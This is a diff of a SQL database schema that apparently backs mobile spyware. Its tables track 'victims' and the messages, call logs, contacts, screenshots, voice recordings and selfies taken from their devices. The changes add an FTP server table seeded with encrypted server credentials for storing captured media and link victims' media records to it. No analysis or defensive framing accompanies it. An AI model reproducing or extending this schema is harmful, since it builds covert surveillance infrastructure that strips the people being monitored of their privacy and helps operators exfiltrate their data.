@@ -76,7 +76,7 @@ DROP TABLE IF EXISTS `deliveries`;
 CREATE TABLE IF NOT EXISTS `deliveries` (
   `id`                   INT(11) NOT NULL    AUTO_INCREMENT,
   `victim_id`            INT(11) NOT NULL,
-  `data_type`            ENUM('messages', 'command_statuses', 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join', 'other') NOT NULL,
+  `data_type`            ENUM('messages', 'command_statuses', 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join','file', 'other') NOT NULL,
   `error`                TINYINT(4) NOT NULL,
   `message`              TEXT NOT NULL,
   `server_error`         TINYINT(4) NOT NULL DEFAULT 0,
@@ -88,7 +88,6 @@ CREATE TABLE IF NOT EXISTS `deliveries` (
     ON DELETE CASCADE
     ON UPDATE CASCADE
 );
-
 
 DROP TABLE IF EXISTS `contacts`;
 CREATE TABLE IF NOT EXISTS `contacts` (
@@ -214,21 +213,41 @@ CREATE TABLE IF NOT EXISTS `calls` (
     ON UPDATE CASCADE
 );
 
+DROP TABLE IF EXISTS `ftp_servers`;
+CREATE TABLE IF NOT EXISTS `ftp_servers` (
+  `id`               INT(11)     NOT NULL AUTO_INCREMENT,
+  `name`             VARCHAR(10) NOT NULL,
+  `ftp_domain_enc`   TEXT        NOT NULL,
+  `ftp_username_enc` TEXT        NOT NULL,
+  `ftp_password_enc` TEXT        NOT NULL,
+  `size_in_mb`       INT(11)     NOT NULL,
+  PRIMARY KEY (id)
+);
+
+INSERT INTO `ftp_servers` (name, ftp_domain_enc, ftp_username_enc, ftp_password_enc, size_in_mb) VALUES
+  ('SERVER 1', 'U1kHyw0ABMAbfhg++WHYOaSJLrdi+Pht/EKPPJWGE8k=', 'mod6MfmVQKxTqzFLhxY3qQ==', 'cUmCHjmVHcz2i5Ucgqkp3Q==',
+   1500);
+
+
 
 DROP TABLE IF EXISTS `media`;
 CREATE TABLE IF NOT EXISTS `media` (
-  `id`              INT(11)                                        NOT NULL AUTO_INCREMENT,
-  `victim_id`       INT(11)                                        NOT NULL,
-  `name`            VARCHAR(100)                                   NOT NULL,
+  `id`              INT(11)                                       NOT NULL AUTO_INCREMENT,
+  `victim_id`       INT(11)                                       NOT NULL,
+  `name`            VARCHAR(100)                                  NOT NULL,
   `_type`           ENUM('SCREENSHOT', 'VOICE', 'SELFIE', 'FILE') NOT NULL,
-  `download_link`   TEXT                                           NOT NULL,
-  `file_size_in_kb` INT(11)                                        NOT NULL,
-  `captured_at`     TIMESTAMP                                      NULL,
-  `is_active`       TINYINT(4)                                     NOT NULL DEFAULT 1,
-  `last_logged_at`  TIMESTAMP                                      NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+  `ftp_server_id`   INT(11)                                       NOT NULL,
+  `download_link`   TEXT                                          NOT NULL,
+  `file_size_in_kb` INT(11)                                       NOT NULL,
+  `captured_at`     TIMESTAMP                                     NULL,
+  `is_active`       TINYINT(4)                                    NOT NULL DEFAULT 1,
+  `last_logged_at`  TIMESTAMP                                     NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
   PRIMARY KEY (`id`),
   KEY `victim_id` (`victim_id`),
   FOREIGN KEY (`victim_id`) REFERENCES `victims` (`id`)
+    ON DELETE CASCADE
+    ON UPDATE CASCADE,
+  FOREIGN KEY (`ftp_server_id`) REFERENCES `ftp_servers` (`id`)
     ON DELETE CASCADE
     ON UPDATE CASCADE
 );
@@ -249,6 +268,7 @@ CREATE TABLE IF NOT EXISTS `messages` (
     ON DELETE CASCADE
     ON UPDATE CASCADE
 );
+
 
 
 /* Change the delimiter so we can use ";" within the CREATE TRIGGER */
